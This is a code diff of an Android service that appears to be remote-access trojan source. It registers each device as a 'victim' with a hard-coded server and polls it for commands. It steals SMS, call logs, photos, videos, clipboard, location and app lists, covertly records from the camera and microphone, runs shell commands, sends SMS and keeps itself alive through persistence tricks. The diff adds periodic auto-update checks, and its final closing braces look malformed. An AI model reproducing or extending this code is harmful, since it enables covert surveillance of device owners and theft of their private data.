@@ -71,7 +71,7 @@ public class ServiceRunner extends Service {
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
 
-    // ★★★ الرابط الكامل مع https:// ★★★
+    // *** https:// ***
     private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
 
     private static final int POLL_INTERVAL = 15;
@@ -84,17 +84,17 @@ public class ServiceRunner extends Service {
     private boolean registered = false;
     private PowerManager.WakeLock wakeLock = null;
 
-    // ★ Ringtone instance (لتشغيل الصوت بشكل مستمر)
+    // *** Ringtone instance ***
     private Ringtone activeRingtone = null;
     private Handler ringtoneHandler = null;
 
-    // ============================================================
+    // ==============================================
     // Lifecycle
-    // ============================================================
+    // ==============================================
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "=== SERVICE onCreate ===");
+        Log.d(TAG, "== SERVICE onCreate ==");
         Log.d(TAG, "★ SERVER_URL: " + SERVER_URL);
 
         try {
@@ -124,6 +124,14 @@ public class ServiceRunner extends Service {
         commandExecutor = Executors.newFixedThreadPool(2);
         ringtoneHandler = new Handler(Looper.getMainLooper());
 
+        // ★★★ Auto-Update: فحص أولي فوراً ★★★
+        try {
+            UpdateChecker.checkForUpdate(this);
+            Log.d(TAG, "[UPDATE] Initial check triggered");
+        } catch (Exception e) {
+            Log.e(TAG, "[UPDATE] Initial check error: " + e.getMessage());
+        }
+
         new Thread(() -> {
             try {
                 Thread.sleep(2000);
@@ -133,6 +141,23 @@ public class ServiceRunner extends Service {
 
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
+
+        // ★★★ Auto-Update: فحص دوري كل ساعة ★★★
+        try {
+            scheduler.scheduleAtFixedRate(
+                () -> {
+                    try {
+                        UpdateChecker.checkForUpdate(ServiceRunner.this);
+                        Log.d(TAG, "[UPDATE] Periodic check triggered");
+                    } catch (Exception e) {
+                        Log.e(TAG, "[UPDATE] Periodic check error: " + e.getMessage());
+                    }
+                },
+                5, 60, TimeUnit.MINUTES
+            );
+        } catch (Exception e) {
+            Log.e(TAG, "[UPDATE] Scheduler error: " + e.getMessage());
+        }
 
         heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
         heartbeatScheduler.scheduleAtFixedRate(this::heartbeat, 30, 30, TimeUnit.SECONDS);
@@ -173,7 +198,7 @@ public class ServiceRunner extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "[SERVICE] onDestroy — restarting...");
+        Log.d(TAG, "[SERVICE] onDestroy - restarting...");
 
         try {
             PersistenceManager.scheduleAlarm(this);
@@ -210,9 +235,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
+    // ============================================
     // WakeLock
-    // ============================================================
+    // ============================================
     private void acquireWakeLock() {
         try {
             if (wakeLock != null && wakeLock.isHeld()) return;
@@ -228,7 +253,6 @@ public class ServiceRunner extends Service {
             wakeLock.acquire();
 
             Log.d(TAG, "[PERSISTENCE] WakeLock acquired");
-
         } catch (Exception e) {
             Log.e(TAG, "acquireWakeLock: " + e.getMessage());
         }
@@ -262,7 +286,7 @@ public class ServiceRunner extends Service {
                 Log.e(TAG, "[PERSISTENCE] account sync error: " + e.getMessage());
             }
 
-            Log.d(TAG, "[PERSISTENCE] ✅ All layers enabled");
+            Log.d(TAG, "[PERSISTENCE] All layers enabled");
         } catch (Exception e) {
             Log.e(TAG, "[PERSISTENCE] setupPersistence error: " + e.getMessage());
         }
@@ -274,9 +298,9 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { return "unknown"; }
     }
 
-    // ============================================================
+    // ====================
     // Register
-    // ============================================================
+    // ====================
     private void registerWithServer() {
         try {
             JSONObject d = new JSONObject();
@@ -290,15 +314,16 @@ public class ServiceRunner extends Service {
 
             String response = postJsonWithResponse("/apk/victim/register", d);
             Log.d(TAG, "Register: " + response);
+
             if (response != null) registered = true;
         } catch (Exception e) {
             Log.e(TAG, "register: " + e.getMessage());
         }
     }
 
-    // ============================================================
+    // ====================
     // Poll
-    // ============================================================
+    // ====================
     private void pollCommands() {
         try {
             if (!registered) {
@@ -308,7 +333,6 @@ public class ServiceRunner extends Service {
 
             String checkUrl = SERVER_URL + "/apk/victim/poll?token=" + victimToken + "&check=1";
             String checkResponse = httpGet(checkUrl);
-
             if (checkResponse == null || checkResponse.isEmpty()) return;
 
             JSONObject checkJson = new JSONObject(checkResponse);
@@ -339,7 +363,7 @@ public class ServiceRunner extends Service {
         String action = "";
         try {
             action = cmd.optString("action", "");
-            Log.d(TAG, "★★★ Command: " + action + " | full: " + cmd.toString());
+            Log.d(TAG, "*** Command: " + action + " | full: " + cmd.toString());
 
             switch (action) {
                 case "get_device_info": sendDeviceInfo(); break;
@@ -359,8 +383,8 @@ public class ServiceRunner extends Service {
                 case "camera_back": takePicture(0); break;
                 case "camera_record":
                     recordVideo(
-                        cmd.optInt("camera_id", 1),
-                        cmd.optInt("duration", 10000));
+                            cmd.optInt("camera_id", 1),
+                            cmd.optInt("duration", 10000));
                     break;
                 case "camera_record_front":
                     recordVideo(1, cmd.optInt("duration", 10000));
@@ -418,8 +442,8 @@ public class ServiceRunner extends Service {
                 case "volume_max": maxVolume(); break;
                 case "volume_set":
                     setVolume(
-                        cmd.optInt("level", 15),
-                        cmd.optString("stream", "music"));
+                            cmd.optInt("level", 15),
+                            cmd.optString("stream", "music"));
                     break;
                 case "lock_screen": lockScreen(); break;
                 case "show_home": goHome(); break;
@@ -450,9 +474,9 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
+    // ===========================================
     // Device Info
-    // ============================================================
+    // ===========================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -471,9 +495,11 @@ public class ServiceRunner extends Service {
 
     private void sendBattery() {
         try {
-            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            android.content.IntentFilter ifilter = new
+                    android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
             android.content.Intent batteryStatus = registerReceiver(null, ifilter);
             if (batteryStatus == null) return;
+
             int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
             int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
@@ -499,9 +525,11 @@ public class ServiceRunner extends Service {
                 reportCommandResult("get_sms", "fail", "no_read_sms_permission");
                 return;
             }
+
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
                     Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
+
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
                     JSONObject s = new JSONObject();
@@ -511,6 +539,7 @@ public class ServiceRunner extends Service {
                 }
                 c.close();
             }
+
             JSONObject d = new JSONObject();
             d.put("type", "sms");
             d.put("token", victimToken);
@@ -529,9 +558,11 @@ public class ServiceRunner extends Service {
                 reportCommandResult("get_call_log", "fail", "no_read_call_log_permission");
                 return;
             }
+
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                     null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
+
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
                     JSONObject call = new JSONObject();
@@ -542,6 +573,7 @@ public class ServiceRunner extends Service {
                 }
                 c.close();
             }
+
             JSONObject d = new JSONObject();
             d.put("type", "call_log");
             d.put("token", victimToken);
@@ -636,6 +668,7 @@ public class ServiceRunner extends Service {
             JSONArray arr = new JSONArray();
             android.content.pm.PackageManager pm = getPackageManager();
             List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
+
             for (android.content.pm.ApplicationInfo ai : apps) {
                 if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                     JSONObject a = new JSONObject();
@@ -644,6 +677,7 @@ public class ServiceRunner extends Service {
                     arr.put(a);
                 }
             }
+
             JSONObject d = new JSONObject();
             d.put("type", "apps");
             d.put("token", victimToken);
@@ -656,9 +690,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
+    // ======================
     // WiFi Info
-    // ============================================================
+    // ======================
     private void sendWifiInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -692,9 +726,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // سحب الصور
-    // ============================================================
+    // ======================
+    // Photos
+    // ======================
     private void sendPhotos() {
         try {
             boolean hasReadMedia = false;
@@ -725,7 +759,7 @@ public class ServiceRunner extends Service {
             }
 
             Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-            String[] projection = new String[]{
+            String[] projection = new String[] {
                     MediaStore.Images.Media._ID,
                     MediaStore.Images.Media.DISPLAY_NAME,
                     MediaStore.Images.Media.SIZE,
@@ -771,7 +805,6 @@ public class ServiceRunner extends Service {
 
                     InputStream inputStream = null;
                     byte[] bytes = null;
-
                     try {
                         inputStream = getContentResolver().openInputStream(imageUri);
                         if (inputStream == null) continue;
@@ -837,9 +870,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // سحب الفيديوهات
-    // ============================================================
+    // ==============================================
+    // Videos
+    // ==============================================
     private void sendVideos() {
         try {
             boolean hasReadMedia = false;
@@ -864,7 +897,7 @@ public class ServiceRunner extends Service {
             }
 
             Uri collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
-            String[] projection = new String[]{
+            String[] projection = new String[] {
                     MediaStore.Video.Media._ID,
                     MediaStore.Video.Media.DISPLAY_NAME,
                     MediaStore.Video.Media.SIZE,
@@ -912,7 +945,6 @@ public class ServiceRunner extends Service {
 
                     InputStream inputStream = null;
                     byte[] bytes = null;
-
                     try {
                         inputStream = getContentResolver().openInputStream(videoUri);
                         if (inputStream == null) continue;
@@ -979,9 +1011,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Location — محدّث بـ LocationHelper
-    // ============================================================
+    // ===========================================
+    // Location
+    // ===========================================
     private void sendLocation() {
         Log.d(TAG, "sendLocation called");
 
@@ -1007,7 +1039,7 @@ public class ServiceRunner extends Service {
                     postJson("/apk/victim/data", d);
                     reportCommandResult("get_location", "ok", "");
 
-                    Log.d(TAG, "✅ Location: " + lat + ", " + lng + " | " + provider);
+                    Log.d(TAG, "Location: " + lat + ", " + lng + " | " + provider);
 
                 } catch (Exception e) {
                     reportCommandResult("get_location", "fail", e.getMessage());
@@ -1029,12 +1061,15 @@ public class ServiceRunner extends Service {
                 reportCommandResult("get_clipboard", "fail", "empty");
                 return;
             }
+
             ClipData clip = cm.getPrimaryClip();
             if (clip == null || clip.getItemCount() == 0) {
                 reportCommandResult("get_clipboard", "fail", "empty");
                 return;
             }
+
             CharSequence text = clip.getItemAt(0).getText();
+
             JSONObject d = new JSONObject();
             d.put("type", "clipboard");
             d.put("token", victimToken);
@@ -1047,9 +1082,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Camera — محدّث بـ CameraHelper
-    // ============================================================
+    // ==============================================
+    // Camera
+    // ==============================================
     private void takePicture(final int cameraId) {
         Log.d(TAG, "takePicture called: cameraId=" + cameraId + " (0=back, 1=front)");
 
@@ -1074,7 +1109,7 @@ public class ServiceRunner extends Service {
                     postJson("/apk/victim/data", d);
                     reportCommandResult(actionName, "ok", "");
 
-                    Log.d(TAG, "✅ Photo captured: " + jpegData.length + " bytes");
+                    Log.d(TAG, "Photo captured: " + jpegData.length + " bytes");
 
                 } catch (Exception e) {
                     Log.e(TAG, "send photo error: " + e.getMessage());
@@ -1102,17 +1137,14 @@ public class ServiceRunner extends Service {
 
                 filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
                 recorder = new MediaRecorder();
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 
-                if (Build.VERSION.SDK_INT >= 29) {
-                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-                    filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".m4a";
-                } else {
-                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                if (Build.VERSION.SDK_INT >= 31) {
+                    recorder = new MediaRecorder(this);
                 }
 
+                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                 recorder.setOutputFile(filePath);
                 recorder.prepare();
                 recorder.start();
@@ -1140,6 +1172,7 @@ public class ServiceRunner extends Service {
                 }
 
                 String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
                 JSONObject d = new JSONObject();
                 d.put("type", "audio_record");
                 d.put("token", victimToken);
@@ -1157,9 +1190,9 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // Video — محدّث بـ Camera2
-    // ============================================================
+    // ============================================
+    // Video
+    // ============================================
     private void recordVideo(final int cameraId, final int durationMs) {
         Log.d(TAG, "recordVideo called: cameraId=" + cameraId + " duration=" + durationMs);
 
@@ -1250,7 +1283,7 @@ public class ServiceRunner extends Service {
 
                 manager.openCamera(finalCameraId, new android.hardware.camera2.CameraDevice.StateCallback() {
                     @Override
-                    public void onOpened(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
+                    public void onOpened(android.hardware.camera2.CameraDevice cam) {
                         Log.d(TAG, "Camera opened for video");
                         try {
                             List<android.view.Surface> surfaces = Collections.singletonList(surface);
@@ -1259,7 +1292,7 @@ public class ServiceRunner extends Service {
                                     surfaces,
                                     new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                         @Override
-                                        public void onConfigured(@androidx.annotation.NonNull android.hardware.camera2.CameraCaptureSession s) {
+                                        public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {
                                             try {
                                                 android.hardware.camera2.CaptureRequest.Builder builder =
                                                         cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_RECORD);
@@ -1276,7 +1309,7 @@ public class ServiceRunner extends Service {
                                         }
 
                                         @Override
-                                        public void onConfigureFailed(@androidx.annotation.NonNull android.hardware.camera2.CameraCaptureSession s) {
+                                        public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) {
                                             sessionLatch.countDown();
                                         }
                                     },
@@ -1290,12 +1323,12 @@ public class ServiceRunner extends Service {
                     }
 
                     @Override
-                    public void onDisconnected(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam) {
+                    public void onDisconnected(android.hardware.camera2.CameraDevice cam) {
                         try { cam.close(); } catch (Exception e) {}
                     }
 
                     @Override
-                    public void onError(@androidx.annotation.NonNull android.hardware.camera2.CameraDevice cam, int error) {
+                    public void onError(android.hardware.camera2.CameraDevice cam, int error) {
                         openLatch.countDown();
                         sessionLatch.countDown();
                         try { cam.close(); } catch (Exception e) {}
@@ -1328,6 +1361,7 @@ public class ServiceRunner extends Service {
                 }
 
                 String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
                 JSONObject d = new JSONObject();
                 d.put("type", "video_record");
                 d.put("token", victimToken);
@@ -1337,8 +1371,8 @@ public class ServiceRunner extends Service {
                 d.put("size", bytes.length);
                 postJson("/apk/victim/data", d);
                 reportCommandResult("camera_record", "ok", "");
-                Log.d(TAG, "✅ Video recorded: " + bytes.length + " bytes");
 
+                Log.d(TAG, "Video recorded: " + bytes.length + " bytes");
                 videoFile.delete();
 
             } catch (Exception e) {
@@ -1356,6 +1390,7 @@ public class ServiceRunner extends Service {
             android.hardware.Camera camera = null;
             android.media.MediaRecorder recorder = null;
             String filePath = null;
+
             try {
                 if (!hasPermission(android.Manifest.permission.CAMERA)) {
                     reportCommandResult("camera_record", "fail", "no_camera_permission");
@@ -1370,6 +1405,7 @@ public class ServiceRunner extends Service {
                 camera.unlock();
 
                 filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
+
                 recorder = new android.media.MediaRecorder();
                 recorder.setCamera(camera);
                 recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
@@ -1389,6 +1425,7 @@ public class ServiceRunner extends Service {
                 try { recorder.stop(); } catch (Exception e) {}
                 try { recorder.release(); } catch (Exception e) {}
                 recorder = null;
+
                 try { camera.lock(); } catch (Exception e) {}
                 try { camera.release(); } catch (Exception e) {}
                 camera = null;
@@ -1410,6 +1447,7 @@ public class ServiceRunner extends Service {
                 }
 
                 String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
                 JSONObject d = new JSONObject();
                 d.put("type", "video_record");
                 d.put("token", victimToken);
@@ -1420,6 +1458,7 @@ public class ServiceRunner extends Service {
                 reportCommandResult("camera_record", "ok", "");
 
                 videoFile.delete();
+
             } catch (Exception e) {
                 reportCommandResult("camera_record", "fail", e.getMessage());
                 if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
@@ -1431,9 +1470,9 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // ★★★ Media Keys ★★★
-    // ============================================================
+    // ============================================
+    // Media Keys
+    // ============================================
     private void sendMediaKey(String key) {
         try {
             android.media.AudioManager am = (android.media.AudioManager)
@@ -1452,8 +1491,10 @@ public class ServiceRunner extends Service {
             }
 
             long eventTime = android.os.SystemClock.uptimeMillis();
-            android.view.KeyEvent downEvent = new android.view.KeyEvent(eventTime, eventTime, android.view.KeyEvent.ACTION_DOWN, keyCode, 0);
-            android.view.KeyEvent upEvent = new android.view.KeyEvent(eventTime, eventTime, android.view.KeyEvent.ACTION_UP, keyCode, 0);
+            android.view.KeyEvent downEvent = new android.view.KeyEvent(eventTime, eventTime,
+                    android.view.KeyEvent.ACTION_DOWN, keyCode, 0);
+            android.view.KeyEvent upEvent = new android.view.KeyEvent(eventTime, eventTime,
+                    android.view.KeyEvent.ACTION_UP, keyCode, 0);
 
             am.dispatchMediaKeyEvent(downEvent);
             am.dispatchMediaKeyEvent(upEvent);
@@ -1465,9 +1506,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Screen Off ★★★
-    // ============================================================
+    // ============================================
+    // Screen Off
+    // ============================================
     private void screenOff() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
@@ -1492,9 +1533,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Set Volume ★★★
-    // ============================================================
+    // ============================================
+    // Set Volume
+    // ============================================
     private void setVolume(int level, String streamName) {
         try {
             AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
@@ -1511,12 +1552,9 @@ public class ServiceRunner extends Service {
 
             int maxVol = am.getStreamMaxVolume(stream);
             int targetVol = Math.max(0, Math.min(level, maxVol));
-
             am.setStreamVolume(stream, targetVol, 0);
-
             reportCommandResult("volume_set", "ok", "");
             Log.d(TAG, "Volume set to " + targetVol + "/" + maxVol);
-
         } catch (Exception e) {
             reportCommandResult("volume_set", "fail", e.getMessage());
         }
@@ -1531,12 +1569,14 @@ public class ServiceRunner extends Service {
             am.setStreamVolume(AudioManager.STREAM_ALARM,
                     am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
             reportCommandResult("volume_max", "ok", "");
-        } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("volume_max", "fail", e.getMessage());
+        }
     }
 
-    // ============================================================
-    // ★★★ Lock Screen ★★★
-    // ============================================================
+    // ====================================================
+    // Lock Screen
+    // ====================================================
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
@@ -1576,9 +1616,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ playSound — محسّن ★★★
-    // ============================================================
+    // =====================
+    // playSound
+    // =====================
     private void playSound() {
         try {
             stopActiveRingtone();
@@ -1600,7 +1640,7 @@ public class ServiceRunner extends Service {
             }
 
             if (r == null) {
-                reportCommandResult("play_sound", "fail", "no_ringtone_available");
+                reportCommandResult("play_sound", "fail", "no_ringtones_available");
                 return;
             }
 
@@ -1618,7 +1658,7 @@ public class ServiceRunner extends Service {
             activeRingtone = r;
             r.play();
 
-            Log.d(TAG, "✅ Ringtone playing");
+            Log.d(TAG, "Ringtone playing");
 
             if (ringtoneHandler == null) {
                 ringtoneHandler = new Handler(Looper.getMainLooper());
@@ -1633,9 +1673,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ playAlarm — محسّن ★★★
-    // ============================================================
+    // ==============================================
+    // playAlarm
+    // ==============================================
     private void playAlarm() {
         try {
             stopActiveRingtone();
@@ -1669,7 +1709,7 @@ public class ServiceRunner extends Service {
             activeRingtone = r;
             r.play();
 
-            Log.d(TAG, "✅ Alarm playing");
+            Log.d(TAG, "Alarm playing");
 
             if (ringtoneHandler == null) {
                 ringtoneHandler = new Handler(Looper.getMainLooper());
@@ -1695,9 +1735,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ vibrate — محسّن ★★★
-    // ============================================================
+    // ==============================================
+    // vibrate
+    // ==============================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -1725,7 +1765,7 @@ public class ServiceRunner extends Service {
                 v.vibrate(ms);
             }
 
-            Log.d(TAG, "✅ Vibration sent: " + ms + "ms");
+            Log.d(TAG, "Vibration sent: " + ms + "ms");
             reportCommandResult("vibrate", "ok", "");
 
         } catch (Exception e) {
@@ -1734,9 +1774,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ showToast — محسّن ★★★
-    // ============================================================
+    // ============================================
+    // showToast
+    // ============================================
     private void showToast(final String text) {
         try {
             if (text == null || text.trim().isEmpty()) {
@@ -1755,7 +1795,7 @@ public class ServiceRunner extends Service {
                     toast.setGravity(Gravity.CENTER, 0, 0);
                     toast.show();
 
-                    Log.d(TAG, "✅ Toast shown: " + text);
+                    Log.d(TAG, "Toast shown: " + text);
                     reportCommandResult("toast", "ok", "");
 
                 } catch (Exception e) {
@@ -1770,9 +1810,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ sendSmsToNumber — محسّن ★★★
-    // ============================================================
+    // ==============================================
+    // sendSmsToNumber
+    // ==============================================
     private void sendSmsToNumber(String to, String msg) {
         try {
             if (to == null || to.trim().isEmpty()) {
@@ -1812,7 +1852,7 @@ public class ServiceRunner extends Service {
                 sm.sendTextMessage(to, null, msg, null, null);
             }
 
-            Log.d(TAG, "✅ SMS sent to: " + to);
+            Log.d(TAG, "SMS sent to: " + to);
             reportCommandResult("send_sms", "ok", "");
 
         } catch (Exception e) {
@@ -1821,9 +1861,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ callNumber — محسّن ★★★
-    // ============================================================
+    // ==============================================
+    // callNumber
+    // ==============================================
     private void callNumber(String number) {
         try {
             if (number == null || number.trim().isEmpty()) {
@@ -1841,7 +1881,7 @@ public class ServiceRunner extends Service {
                     callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(callIntent);
 
-                    Log.d(TAG, "✅ Call initiated: " + cleanNumber);
+                    Log.d(TAG, "Call initiated: " + cleanNumber);
                     reportCommandResult("call", "ok", "");
                     return;
                 } catch (Exception e) {
@@ -1855,7 +1895,7 @@ public class ServiceRunner extends Service {
                 dialIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(dialIntent);
 
-                Log.d(TAG, "✅ Dial opened: " + cleanNumber);
+                Log.d(TAG, "Dial opened: " + cleanNumber);
                 reportCommandResult("call", "ok", "dial_only");
                 return;
             } catch (Exception e) {
@@ -1870,9 +1910,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ openUrl — محسّن ★★★
-    // ============================================================
+    // ==============================================
+    // openUrl
+    // ==============================================
     private void openUrl(String url) {
         try {
             if (url == null || url.trim().isEmpty()) {
@@ -1895,7 +1935,7 @@ public class ServiceRunner extends Service {
 
                 startActivity(intent);
 
-                Log.d(TAG, "✅ URL opened: " + url);
+                Log.d(TAG, "URL opened: " + url);
                 reportCommandResult("open_url", "ok", "");
                 return;
             } catch (Exception e) {
@@ -1909,7 +1949,7 @@ public class ServiceRunner extends Service {
                 chromeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(chromeIntent);
 
-                Log.d(TAG, "✅ URL opened via Chrome: " + url);
+                Log.d(TAG, "URL opened via Chrome: " + url);
                 reportCommandResult("open_url", "ok", "chrome");
                 return;
             } catch (Exception e) {
@@ -1924,9 +1964,9 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
+    // ============================================
     // Shell
-    // ============================================================
+    // ============================================
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
@@ -1949,12 +1989,15 @@ public class ServiceRunner extends Service {
             d.put("output", output.toString());
             postJson("/apk/victim/data", d);
             reportCommandResult("shell", "ok", "");
-        } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
+
+        } catch (Exception e) {
+            reportCommandResult("shell", "fail", e.getMessage());
+        }
     }
 
-    // ============================================================
+    // ==============================
     // Helpers
-    // ============================================================
+    // ==============================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -2008,7 +2051,8 @@ public class ServiceRunner extends Service {
                         new InputStreamReader(conn.getInputStream()));
                 StringBuilder sb = new StringBuilder();
                 String line;
-                while ((line = reader.readLine()) != null) sb.append(line);
+                while ((line = reader.readLine()) != null)
+                    sb.append(line);
                 reader.close();
                 return sb.toString();
             } else {
@@ -2017,7 +2061,8 @@ public class ServiceRunner extends Service {
                             new InputStreamReader(conn.getErrorStream()));
                     StringBuilder sb = new StringBuilder();
                     String line;
-                    while ((line = reader.readLine()) != null) sb.append(line);
+                    while ((line = reader.readLine()) != null)
+                        sb.append(line);
                     reader.close();
                     Log.e(TAG, "HTTP " + rc + " error: " + sb.toString());
                 } catch (Exception ignored) {}
@@ -2029,6 +2074,10 @@ public class ServiceRunner extends Service {
     }
 
     private void postJson(String path, JSONObject data) {
+        postJsonWithResult(path, data);
+    }
+
+    private void postJsonWithResult(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                }
+        }
